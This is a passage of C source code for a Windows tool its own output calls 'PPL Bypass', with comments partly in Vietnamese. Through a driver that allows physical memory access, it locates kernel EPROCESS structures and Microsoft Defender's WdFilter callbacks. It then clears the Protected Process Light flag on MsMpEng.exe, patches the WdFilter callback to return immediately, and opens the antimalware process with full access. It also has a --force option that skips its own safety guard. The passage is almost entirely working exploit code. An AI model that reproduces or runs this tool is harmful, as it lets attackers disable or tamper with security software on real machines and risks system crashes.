                    for(int d=0;d<*n_cbs_out;d++)
                        if(cb_pa_arr[d]==entry_pa2){dup2=1;break;}
                    if(dup2||*n_cbs_out>=MAX_CBS) continue;
                    cb_pa_arr[*n_cbs_out]=entry_pa2;
                    cb_preop_arr[*n_cbs_out]=preop;
                    (*n_cbs_out)++;
                    printf("\n  [CB-B#%d] PA=0x%016llX  ops=%u  preop=0x%016llX\n",
                           *n_cbs_out,(unsigned long long)entry_pa2,ops,
                           (unsigned long long)preop);
                }
            }

            /* ── EPROCESS search (target + self) ─────────────────────── */
            int need_tgt  = (tgt_out->pa==0);
            int need_self = (self_out->pa==0);
            if (!need_tgt && !need_self) continue;

            for (uint64_t off=0;off+8<=csz;off+=8){
                uint8_t c=g_chunk[off];
                if (c<'A'||c>'z'||c=='['||c=='\\'||c==']'||c=='^'||c=='`') continue;

                uint64_t abs=cpa+off;
                uint64_t epa=abs-OFF_NAME;
                if (!pa_in_range(epa,EPROC_SZ_MAX)) continue;

                if (epa>=cpa && epa+EPROC_SZ_MAX<=cpa+csz)
                    memcpy(ep, g_chunk+(epa-cpa), EPROC_SZ_MAX);
                else
                    if (!phys_read(epa,ep,EPROC_SZ_MAX)) continue;

                uint64_t pid=*(uint64_t*)(ep+OFF_PID);
                if (!pid||pid>0xFFFF) continue;
                if (memcmp(ep+OFF_NAME,g_chunk+off,4)) continue;

                int ok=1;
                for (int k=0;k<15;k++){
                    uint8_t nc=ep[OFF_NAME+k]; if (!nc) break;
                    if (nc<0x20||nc>0x7E){ok=0;break;}
                }
                if (!ok) continue;

                uint64_t token=*(uint64_t*)(ep+OFF_TOKEN);
                uint64_t cr3  =*(uint64_t*)(ep+OFF_DTB);
                uint64_t flink=*(uint64_t*)(ep+OFF_FLINK);
                uint64_t blink=*(uint64_t*)(ep+OFF_BLINK);
                if ((token&~0xFULL)<0xFFFF800000000000ULL) continue;
                if (!cr3||(cr3&0xFFF)||cr3>0x10000000000ULL) continue;
                if (flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL) continue;

                uint32_t upid=(uint32_t)pid;
                char name[16]={0}; memcpy(name,ep+OFF_NAME,15);
                uint8_t prot=0; phys_read(epa+OFF_PROT,&prot,1);

                if (need_tgt && upid==target_pid &&
                    _strnicmp(name,target_name,15)==0) {
                    tgt_out->pa=epa; tgt_out->pid=upid; tgt_out->prot=prot;
                    memcpy(tgt_out->name,name,15);
                    printf("\n  [TARGET] PA=0x%016llX  prot=0x%02X  %s\n",
                           (unsigned long long)epa,prot,name);
                    need_tgt=0;
                }
                if (need_self && upid==self_pid) {
                    self_out->pa=epa; self_out->pid=upid; self_out->prot=prot;
                    memcpy(self_out->name,name,15);
                    printf("\n  [SELF]   PA=0x%016llX  prot=0x%02X  %s\n",
                           (unsigned long long)epa,prot,name);
                    need_self=0;
                }
            }
        }
    }
}

/* ════════════════════════════════════════════════════════════════════════ */
int main(int argc, char **argv)
{
    const char *target_name = "MsMpEng.exe";
    uint32_t    forced_pid  = 0;
    int         list_mode   = 0;
    int         force_signer= 0;  /* --force: bypass signer guard (for testing) */
    if (argc>=2){
        if (strcmp(argv[1],"--list")==0){
            list_mode=1; target_name=NULL;
        } else if (strcmp(argv[1],"--pid")==0 && argc>=3){
            forced_pid=(uint32_t)atoi(argv[2]);
            target_name=(argc>=4)?argv[3]:argv[2];
        } else if (strcmp(argv[1],"--force")==0 && argc>=3){
            force_signer=1; target_name=argv[2];
        } else {
            target_name=argv[1];
        }
    }

    printf("=== PPL Bypass (integrated) ===\n");
    printf("    Target: %s\n\n", target_name);

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                      0,NULL,OPEN_EXISTING,0,NULL);
    if (g_dev==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open device: %lu\n",GetLastError()); return 1;
    }
    printf("[+] Device opened\n\n");

    detect_offsets();

    load_ranges();
    printf("[1] Physical ranges: %d\n\n", g_nranges);

    /* ── SELF-TEST MODE: tạo notepad suspended → set PPL → verify → clear → verify ─
     * Dùng --list để chạy test này.
     * Test này isolate chính xác: "does EPROCESS.Protection clear → OpenProcess work?"
     * mà không có WdFilter interference (WdFilter không protect notepad).
     * 100% an toàn: signer do ta tự set, không động đến WinTcb/WinSystem.
     */
    if (list_mode) {
        printf("[SELF-TEST] Create notepad (suspended) → fake PPL → test bypass\n\n");

        /* 1. Tạo notepad suspended */
        STARTUPINFOA si = {sizeof si};
        PROCESS_INFORMATION pi = {0};
        char cmd[] = "notepad.exe";
        if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            printf("[-] CreateProcess(notepad) failed: %lu\n", GetLastError());
            CloseHandle(g_dev); return 1;
        }
        printf("[1] Created notepad.exe  PID=%u\n\n", pi.dwProcessId);

        /* 2. Tìm EPROCESS bằng SHI (nhanh, không cần scan) */
        typedef NTSTATUS (NTAPI *PFN_NTQSI_)(ULONG,PVOID,ULONG,PULONG);
        PFN_NTQSI_ fn=(PFN_NTQSI_)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                                   "NtQuerySystemInformation");
        uint64_t np_va = 0;
        if (fn) {
            typedef struct {
                USHORT UniqueProcessId, CreatorBackTraceIndex;
                UCHAR  ObjectTypeIndex, HandleAttributes;
                USHORT HandleValue;
                PVOID  Object;
                ULONG  GrantedAccess;
            } SHI_E;
            typedef struct { ULONG N; SHI_E H[1]; } SHI_BUF;
            HANDLE hq = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                    FALSE, pi.dwProcessId);
            if (hq) {
                ULONG sz=0x100000; SHI_BUF *buf=NULL; NTSTATUS st;
                do { free(buf); sz+=0x10000; buf=(SHI_BUF*)malloc(sz);
                     st=fn(16,buf,sz,NULL); } while (st==(NTSTATUS)0xC0000004L);
                if (!st) {
                    DWORD my=GetCurrentProcessId();
                    for (ULONG i=0;i<buf->N;i++){
                        if ((DWORD)buf->H[i].UniqueProcessId!=my) continue;
                        if ((HANDLE)(ULONG_PTR)buf->H[i].HandleValue!=hq) continue;
                        np_va=(uint64_t)buf->H[i].Object; break;
                    }
                }
                free(buf); CloseHandle(hq);
            }
        }
        printf("[2] notepad EPROCESS VA = 0x%016llX\n", (unsigned long long)np_va);

        /* 3. Scan để tìm EPROCESS PA (dùng SHI VA + scan) */
        printf("[3] Scanning RAM for notepad EPROCESS (PID=%u)...\n", pi.dwProcessId);
        EprocEntry np_ep={0};
        {
            uint64_t cb_a[1]={0}; uint64_t cb_b[1]={0}; int n=0;
            EprocEntry dummy={0};
            single_pass_scan(0,0,0,0,0,0, pi.dwProcessId,"notepad.exe",
                             GetCurrentProcessId(),
                             cb_a,cb_b,&n, &np_ep, &dummy);
        }
        if (!np_ep.pa) {
            printf("[-] notepad EPROCESS not found\n");
            TerminateProcess(pi.hProcess,0);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            CloseHandle(g_dev); return 1;
        }
        printf("    PA=0x%016llX  prot=0x%02X\n\n",
               (unsigned long long)np_ep.pa, np_ep.prot);

        /* 4. Set Protection = 0x31 (Antimalware/PPL) */
        uint8_t fake_ppl = 0x31;
        phys_write_verified(np_ep.pa + OFF_PROT, &fake_ppl, 1);

        {   /* Verify: OpenProcess ALL_ACCESS should FAIL now */
            HANDLE ht = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
            printf("[4] OpenProcess after SET prot=0x31: %s  (expected FAIL)\n",
                   ht ? "[PASS — PPL not effective!]" : "[FAIL — PPL active ✓]");
            if (ht) CloseHandle(ht);
        }

        /* 5. Clear Protection = 0x00 + cache evict */
        uint8_t zero = 0;
        phys_write_verified(np_ep.pa + OFF_PROT, &zero, 1);
        cache_evict();

        {   /* Verify: OpenProcess ALL_ACCESS should PASS now */
            HANDLE ht = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
            printf("[5] OpenProcess after CLEAR prot=0x00: %s  (expected PASS)\n",
                   ht ? "[PASS — bypass CONFIRMED ✓]" : "[FAIL — still blocked!]");
            if (ht) {
                printf("\n    === MECHANISM CONFIRMED WORKING ===\n");
                printf("    Protection clear → OpenProcess succeeds.\n");
                printf("    WdFilter does NOT block non-WD processes.\n");
                printf("    For MsMpEng: the ONLY remaining blocker is WdFilter callback.\n");
                CloseHandle(ht);
            } else {
                printf("\n    === MECHANISM FAILED ===\n");
                printf("    Even for non-WD process (notepad), OpenProcess blocked.\n");
                printf("    Root cause is NOT WdFilter callback — something else blocks.\n");
            }
        }

        /* Restore và cleanup */
        phys_write(np_ep.pa + OFF_PROT, &np_ep.prot, 1);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        CloseHandle(g_dev); return 0;
        CloseHandle(g_dev); return 0;
    }

    uint32_t target_pid = forced_pid ? forced_pid : get_pid(target_name);
    if (!target_pid){
        printf("[-] Process '%s' not found\n",target_name); return 1;
    }
    printf("[2] Target PID = %u\n", target_pid);

    HANDLE h_before=OpenProcess(PROCESS_ALL_ACCESS,FALSE,target_pid);
    if (h_before){
        printf("[!] Already openable — no PPL?\n"); CloseHandle(h_before);
    } else {
        printf("    OpenProcess before bypass: FAILED err=%lu — PPL confirmed\n\n",
               GetLastError());
    }

    /* ── ntoskrnl VA + PA + sizes ────────────────────────────────────────── */
    printf("[3] Getting ntoskrnl...\n");
    char nt_path[MAX_PATH]={0};
    uint64_t nt_va=get_ntoskrnl_va(nt_path);
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if (!nt_pa){printf("[-] ntoskrnl PA not found\n");return 1;}

    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe_buf=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe_buf,fsz,&rd,NULL); CloseHandle(hf);
    uint64_t nt_size=*(uint32_t*)(pe_buf+(*(int32_t*)(pe_buf+0x3C))+0x50);

    uint32_t pst_rva=pe_export_rva(pe_buf,fsz,"PsProcessType");
    free(pe_buf);
    if (!pst_rva){printf("[-] PsProcessType RVA not found\n");return 1;}

    uint64_t objtype_va=0;
    if (!phys_read(nt_pa+pst_rva,&objtype_va,8)||!objtype_va){
        printf("[-] Cannot read PsProcessType\n");return 1;
    }
    printf("    ntoskrnl  VA=0x%016llX  PA=0x%016llX\n",
           (unsigned long long)nt_va,(unsigned long long)nt_pa);
    printf("    ObjType   VA=0x%016llX\n\n",(unsigned long long)objtype_va);

    /* ── WdFilter range ──────────────────────────────────────────────────── */
    printf("[4] WdFilter range...\n");
    uint64_t wdf_base=0, wdf_size=0;
    if (!get_module_range("WdFilter.sys",&wdf_base,&wdf_size))
        printf("    [!] WdFilter not found — callback patch skipped\n\n");
    else
        printf("    base=0x%016llX  size=0x%X\n\n",
               (unsigned long long)wdf_base,(unsigned)wdf_size);

    /* ── Try authoritative path via SHI + CR3 ────────────────────────────── */
    printf("[5] Authoritative EPROCESS lookup (SHI + CR3)...\n");
    EprocEntry tgt_ep={0}, self_ep={0};

    EprocEntry sys_ep={0};
    int sys_found = scan_system_eproc(&sys_ep);

    int cr3_valid=0;
    if (sys_found){
        /* Cross-validate CR3: va_to_pa(cr3, VA_of_System) must ≈ sys_ep.pa */
        uint64_t sys_va = shi_get_eproc_va(4);
        if (sys_va){
            uint64_t check_pa=0;
            if (va_to_pa(sys_ep.cr3, sys_va, &check_pa)){
                cr3_valid = ((check_pa&~0xFFFULL)==(sys_ep.pa&~0xFFFULL));
                printf("    CR3 cross-check: sys_va=0x%llX → PA=0x%llX  %s\n",
                       (unsigned long long)sys_va,
                       (unsigned long long)check_pa,
                       cr3_valid?"[VALID]":"[MISMATCH — fallback to scan]");
            }
        } else {
            printf("    SHI lookup failed — falling back to scan\n");
        }
    }

    if (cr3_valid){
        /* Authoritative PA for target */
        uint64_t tgt_va  = shi_get_eproc_va(target_pid);
        uint64_t self_va = shi_get_eproc_va(GetCurrentProcessId());

        if (tgt_va){
            uint64_t tpa=0;
            if (va_to_pa(sys_ep.cr3,tgt_va,&tpa)&&tpa){
                tgt_ep.pa=tpa; tgt_ep.pid=target_pid;
                phys_read(tpa+OFF_PROT,&tgt_ep.prot,1);
                strncpy(tgt_ep.name,target_name,15);
                printf("    [TARGET auth] PA=0x%016llX  prot=0x%02X\n",
                       (unsigned long long)tpa,tgt_ep.prot);
            }
        }
        if (self_va){
            uint64_t spa=0;
            if (va_to_pa(sys_ep.cr3,self_va,&spa)&&spa){
                self_ep.pa=spa; self_ep.pid=GetCurrentProcessId();
                phys_read(spa+OFF_PROT,&self_ep.prot,1);
                printf("    [SELF   auth] PA=0x%016llX  prot=0x%02X\n",
                       (unsigned long long)spa,self_ep.prot);
            }
        }
    }
    printf("\n");

    /* ── Single-pass 64KB scan: collect ALL WdFilter callbacks + EPROCESS ─── */
    printf("[6] Single-pass RAM scan (64KB chunks)...\n\n");
    uint64_t cb_pa_arr[MAX_CBS]={0}, cb_preop_arr[MAX_CBS]={0};
    int n_cbs=0;
    uint64_t list_head_va = objtype_va + 0x0C8;

    EprocEntry scan_tgt={0}, scan_self={0};
    single_pass_scan(objtype_va, list_head_va,
                     wdf_base, wdf_size, nt_va, nt_size,
                     target_pid, target_name, GetCurrentProcessId(),
                     cb_pa_arr, cb_preop_arr, &n_cbs,
                     tgt_ep.pa ? NULL : &scan_tgt,
                     self_ep.pa? NULL : &scan_self);

    if (!tgt_ep.pa  && scan_tgt.pa)  tgt_ep  = scan_tgt;
    if (!self_ep.pa && scan_self.pa) self_ep  = scan_self;

    printf("[6c] Results:\n");
    printf("    WdFilter callbacks found: %d\n", n_cbs);
    for (int i=0;i<n_cbs;i++)
        printf("    [%d] PA=0x%016llX  PreOp=0x%016llX\n",
               i, (unsigned long long)cb_pa_arr[i],
               (unsigned long long)cb_preop_arr[i]);
    printf("    Target   PA  = 0x%016llX  prot=0x%02X  %s\n",
           (unsigned long long)tgt_ep.pa,tgt_ep.prot,tgt_ep.name);
    printf("    Self     PA  = 0x%016llX  prot=0x%02X\n\n",
           (unsigned long long)self_ep.pa,self_ep.prot);

    if (!tgt_ep.pa){
        printf("[-] Target EPROCESS not found\n"); CloseHandle(g_dev); return 1;
    }

    uint8_t tgt_prot_orig=tgt_ep.prot;
    uint8_t sg=(tgt_prot_orig>>4)&0xF, tp=tgt_prot_orig&0x7;
    if ((sg>3||tp>1) && !force_signer){
        printf("[!] Signer=%u type=%u — normally PatchGuard protected.\n",sg,tp);
        printf("    Use --force %s to bypass anyway (test only).\n", target_name);
        printf("    WARNING: Modifying Protection for signer>3 may trigger BSOD.\n");
        CloseHandle(g_dev); return 1;
    }
    if (force_signer && (sg>3||tp>1))
        printf("[!] --force: bypassing signer guard (signer=%u) — BSOD risk!\n\n",sg);

    /* ── Quick diagnostic: verify write reaches live EPROCESS ───────────── */
    {
        typedef NTSTATUS (NTAPI *PFN_NTQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
        PFN_NTQIP NtQIP=(PFN_NTQIP)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),"NtQueryInformationProcess");
        HANDLE hQLP=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,target_pid);

        uint8_t z=0;
        phys_write(tgt_ep.pa+OFF_PROT,&z,1);
        UCHAR v=0xFF;
        if (hQLP&&NtQIP) NtQIP(hQLP,61,&v,1,NULL);
        phys_write(tgt_ep.pa+OFF_PROT,&tgt_prot_orig,1);

        if (hQLP) CloseHandle(hQLP);

        printf("[6b] Write diagnostic: NtQIP after clear = 0x%02X  ", v);
        if (v==0x00)
            printf("→ live PA confirmed, blocker is ObCallback\n\n");
        else if (v==tgt_prot_orig)
            printf("→ STALE PA — phys_write not reaching live EPROCESS\n"
                   "    Hint: CR3 walk failed, scan found wrong copy\n\n");
        else
            printf("→ unexpected\n\n");

        if (v==tgt_prot_orig && !cr3_valid){
            printf("[-] Cannot proceed: stale PA and no valid CR3\n");
            printf("    Try rebooting and re-running immediately after login.\n");
            CloseHandle(g_dev); return 1;
        }
    }

    printf("    --> Press Enter to proceed, Ctrl+C to abort: ");
    fflush(stdout); getchar(); printf("\n");

    /* ── Step 7a: Diagnostic — verify writes actually reach DRAM ───────────── */
    printf("[7a] Write verification (phys_write + readback)...\n");
    {
        uint8_t zero8[8]={0}, zero1=0;
        int all_ok = 1;

        /* Verify EPROCESS.Protection write */
        int prot_ok = phys_write_verified(tgt_ep.pa+OFF_PROT, &zero1, 1);
        printf("    EPROCESS.Protection write: %s\n", prot_ok?"OK":"FAIL (MmMapIoSpace NULL!)");
        phys_write(tgt_ep.pa+OFF_PROT, &tgt_prot_orig, 1);  /* restore */
        if (!prot_ok) all_ok = 0;

        /* Verify callback PreOp writes */
        for (int ci=0;ci<n_cbs;ci++){
            int cb_ok = phys_write_verified(cb_pa_arr[ci]+0x28, zero8, 8);
            printf("    Callback[%d] PreOp write: %s\n", ci, cb_ok?"OK":"FAIL");
            phys_write(cb_pa_arr[ci]+0x28, &cb_preop_arr[ci], 8);  /* restore */
            if (!cb_ok) all_ok = 0;
        }

        if (!all_ok)
            printf("    [!] Some writes FAILED — MmMapIoSpace returns NULL for those PAs\n"
                   "        → Switching to PreOp function code patch\n\n");
        else
            printf("    [+] All writes verified — cache coherency might be the issue\n\n");
    }

    /* ── Step 7b: Patch WdFilter PreOp function bytecode ─────────────────────
     * Zero-ing callback entry might fail due to cache coherency or MmMapIoSpace.
     * Patching the FUNCTION CODE (0xC3 = RET) bypasses ALL of these issues:
     *   - No cache problem (code pages read on every call — always fresh)
     *   - Works regardless of how many callbacks exist or which ObjectType
     *   - Works regardless of Enabled flag
     *   - Function returns immediately → no access strip → OpenProcess passes
     */
    printf("[7b] Finding WdFilter PreOp function in RAM for code patch...\n");
    uint64_t preop_va = (n_cbs > 0) ? cb_preop_arr[0] : 0;
    if (!preop_va) {
        printf("    [!] No callback found — cannot code-patch. Abort.\n");
        CloseHandle(g_dev); return 1;
    }

    uint8_t orig_preop_byte = 0;
    uint64_t preop_code_pa = find_wdfilter_preop_pa(preop_va, wdf_base, wdf_size, &orig_preop_byte);

    HANDLE hProc = NULL;
    uint8_t zero1 = 0, fake_prot = 0x31;

    if (preop_code_pa) {
        printf("    PreOp code PA = 0x%016llX  orig_byte=0x%02X\n\n",
               (unsigned long long)preop_code_pa, orig_preop_byte);

        /* Patch: RET (0xC3) at first byte of PreOp function */
        uint8_t ret_insn = 0xC3;
        if (phys_write_verified(preop_code_pa, &ret_insn, 1)) {
            printf("    [+] PreOp patched to RET. Attempting OpenProcess...\n");

            /* Also clear Protection */
            phys_write(tgt_ep.pa+OFF_PROT, &zero1, 1);
            if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &fake_prot, 1);

            hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

            /* Restore self immediately */
            if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &self_ep.prot, 1);

            /* Restore original byte BEFORE checking result */
            phys_write(preop_code_pa, &orig_preop_byte, 1);

            if (hProc)
                printf("    [+] SUCCESS!\n\n");
            else
                printf("    [-] Still blocked (err=%lu)\n\n", GetLastError());
        } else {
            printf("    [-] Code patch write FAILED — code page not writable via MmMapIoSpace\n\n");
        }
    } else {
        printf("    [!] PreOp function not found in RAM\n\n");
    }

    /* ── Fallback: entry-level approach if code patch not available ──────── */
    if (!hProc) {
        printf("[7c] Fallback: entry-level zero + cache evict...\n\n");
        uint8_t zero8[8]={0};

        for (int attempt=1; attempt<=3&&!hProc; attempt++){
            for (int ci=0;ci<n_cbs;ci++){
                phys_write(cb_pa_arr[ci]+0x28, zero8, 8);
                phys_write(cb_pa_arr[ci]+0x30, zero8, 8);
            }
            phys_write(tgt_ep.pa+OFF_PROT, &zero1, 1);
            if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &fake_prot, 1);
            cache_evict();
            hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,target_pid);
            if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &self_ep.prot, 1);
            if (hProc){ printf("    [+] SUCCESS at attempt #%d!\n\n",attempt); break; }
            printf("    [-] attempt %d: still blocked (err=%lu)\n",attempt,GetLastError());
        }
    }

    /* Always restore */
    phys_write(tgt_ep.pa+OFF_PROT, &tgt_prot_orig, 1);
    for (int ci=0;ci<n_cbs;ci++)
        if (cb_preop_arr[ci]) phys_write(cb_pa_arr[ci]+0x28, &cb_preop_arr[ci], 8);

    if (!hProc){
        printf("\n[-] All approaches failed.\n");
        printf("    Key diagnostics from [7a] will show root cause.\n");
        CloseHandle(g_dev); return 1;
    }

    char img[MAX_PATH]={0}; DWORD isz=sizeof img;
    if (QueryFullProcessImageNameA(hProc,0,img,&isz))
        printf("    Image: %s\n",img);

    CloseHandle(hProc);
    printf("[8] Protection restored to 0x%02X, WdFilter callback restored\n",tgt_prot_orig);
    CloseHandle(g_dev);
    printf("\nDone. PPL bypass confirmed.\n");
    return 0;
}
